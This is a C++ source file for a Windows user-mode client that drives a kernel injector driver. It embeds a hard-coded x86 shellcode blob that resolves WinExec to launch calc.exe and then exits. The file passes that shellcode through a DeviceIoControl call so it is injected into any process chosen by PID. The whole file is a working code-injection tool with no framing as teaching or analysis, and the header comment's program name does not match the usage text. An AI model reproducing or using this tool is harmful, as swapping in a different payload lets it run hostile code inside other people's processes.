// ProcessProtectClient.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <Windows.h>
#include <stdio.h>
#include <vector>
#include <string>
#include <fstream>
#include <iostream>

#include "..\InjectorKM\InjectorCommon.h"

int Error(const char* msg)
{
	printf("%s (Error: %d)\n", msg, ::GetLastError());
	return 1;
}

int PrintUsage()
{
	printf("InjectorUM [pid]\n");
	return 0;
}

std::vector<BYTE> read_file(std::wstring path)
{
	std::ifstream input(path, std::ios::binary);
	if (!input.good()) {
		return { };
	}
	// copies all data into buffer
	std::vector<BYTE> buffer(std::istreambuf_iterator<char>(input), {});
	return buffer;
}

char shellcode[] = \
"\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b"
"\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3"
"\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24"
"\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14"
"\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18"
"\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74"
"\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41"
"\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52"
"\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51"
"\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff"
"\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f"
"\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2"
"\x52\xff\xd0";


int wmain(int argc, const wchar_t* argv[]) {
	if (argc < 2)
		return PrintUsage();

	HANDLE hFile = ::CreateFile(L"\\\\.\\" INJECTOR_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
	if (hFile == INVALID_HANDLE_VALUE)
		return Error("Failed to open device");

	InjectorInfo info;
	info.pid = _wtoi(argv[1]);
	info.buffer_size = strlen(shellcode);
	memcpy(info.buffer, shellcode, info.buffer_size);



	BOOL success = FALSE;
	DWORD bytes;

	success = ::DeviceIoControl(hFile, IOCTL_INJECT_BY_PID, &info, sizeof InjectorInfo, nullptr, 0, &bytes, nullptr);

	if (success == 0)
		return Error("Failed in DeviceIoControl");

	printf("Operation succeeded.\n");

	::CloseHandle(hFile);

	return 0;
}